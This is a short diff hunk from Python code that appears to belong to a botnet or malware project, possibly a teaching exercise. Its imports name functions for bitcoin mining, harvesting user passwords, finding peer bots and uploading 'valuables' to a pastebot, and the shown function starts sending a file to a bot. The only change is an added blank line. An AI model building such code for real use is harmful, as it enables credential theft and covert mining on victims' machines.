@@ -6,6 +6,7 @@ from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
 
+
 def p2p_upload(fn):
     sconn = find_bot()
     sconn.send(bytes("FILE", "ascii"))
